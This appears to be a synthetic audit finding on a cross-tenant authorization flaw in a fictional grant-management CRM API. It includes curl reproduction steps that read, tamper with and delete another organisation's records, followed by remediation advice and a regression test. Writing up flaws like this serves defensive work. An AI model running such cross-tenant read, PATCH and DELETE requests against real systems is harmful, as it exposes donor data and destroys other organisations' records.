## System

- System: GrantFlow CRM API v1.2.0
- Domain: NON-PROFIT / GRANT MANAGEMENT
- Example ID: BOLA-0077
- Risk ID: RISK-33-077

## Findings

### 1. Pattern 3.3 — Semantic Ambiguity: Over-Broad `/api/v1/entitys` Endpoint (HAR Primary)

**HAR evidence**: JWT `X-Tenant-ID: ORG-3BED`. Request: `GET /api/v1/entitys/ENT-2077`. Response: HTTP 200 OK with `"tenantId": "ORG-62CB"` → corrected: `"tenantId": "ORG-8B7E"`, `"ownerId": "other-user-3bed8b7e"`, `"sensitiveData": "CONFIDENTIAL: cross-tenant data for ORG-8B7E"`.

**Pattern 3.3 (Semantic Ambiguity — Over-Broad Endpoints — Insecure Design)**: the `/api/v1/entitys` endpoint is semantically over-broad — `entitys` is a generic resource type that can represent any of: grant applications, donor records, beneficiary records, or program data. The insecure design creates semantic ambiguity: no entity-type-level or tenant-level access control is applied because the endpoint's semantics are too broad to enforce meaningful authorization. The handler queries by `entity_id` alone (Section 4.0 — "does NOT use tenant_id in authorization checks", RISK-33-077), allowing any authenticated user to access any entity across any tenant.

**Non-Profit / Grant Management impact**: entities represent grant applications (with financial data), donor records (with PII and contribution history), or beneficiary records. Cross-tenant access enables one non-profit's staff to read another organization's grant applications, donor strategies, or beneficiary PII. PATCH/DELETE enables unauthorized modification or destruction of grant records — violating donor privacy and grant program integrity.

## Reproduction

**Step 1 — Baseline:**

```bash
curl -s "https://api.grantflow-crm-a.example.com/api/v1/entitys/ENT-1077" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-3BED>" \
  -H "X-Tenant-ID: ORG-3BED"
```

Expected: `tenantId: "ORG-3BED"` — own entity record.

**Step 2 — Cross-tenant entity read (primary HAR attack):**

```bash
curl -s "https://api.grantflow-crm-a.example.com/api/v1/entitys/ENT-2077" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-3BED>" \
  -H "X-Tenant-ID: ORG-3BED"
```

Expected secure: HTTP 403 or 404.  
Expected vulnerable: HTTP 200 with `tenantId: "ORG-8B7E"` and grant/donor `sensitiveData`.

**Step 3 — Cross-tenant entity PATCH (write exploitation of over-broad endpoint):**

```bash
curl -s -X PATCH "https://api.grantflow-crm-a.example.com/api/v1/entitys/ENT-2077" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-3BED>" \
  -H "X-Tenant-ID: ORG-3BED" \
  -H "Content-Type: application/json" \
  -d '{"status": "rejected", "sensitive_data": "tampered_by_attacker"}'
```

Expected secure: HTTP 403.  
Expected vulnerable: HTTP 200 — competitor's grant application tampered or rejected.

**Step 4 — Cross-tenant entity DELETE:**

```bash
curl -s -X DELETE "https://api.grantflow-crm-a.example.com/api/v1/entitys/ENT-2077" \
  -H "Authorization: Bearer <TOKEN_TENANT_ORG-3BED>" \
  -H "X-Tenant-ID: ORG-3BED"
```

Expected vulnerable: HTTP 200 — competitor's grant record destroyed.

## Evidence

- **HAR**: `GET /api/v1/entitys/ENT-2077` with `ORG-3BED` JWT → HTTP 200 → `tenantId: ORG-8B7E` with `sensitiveData`.
- **Section 4.0 (RISK-33-077)**: Pattern 3.3 — GET/PATCH/DELETE lack tenant/owner filter.
- **Section 3.0**: Application code does not use `tenant_id` in authorization checks.

## Remediation

- **Add `WHERE tenant_id = $jwt_tenant_id AND owner_id = $jwt_sub`** to GET/PATCH/DELETE handlers (RISK-33-077, unblock #DB-177).
- **Replace over-broad endpoints with type-specific resources**: `/api/v1/grants/:id`, `/api/v1/donors/:id` — each with explicit access control semantics per entity type.
- **Centralize authorization middleware**: entity type and tenant must both be validated before ID resolution.
- **Regression test**: Tenant A token requests Tenant B `entity_id` — assert HTTP 403/404.
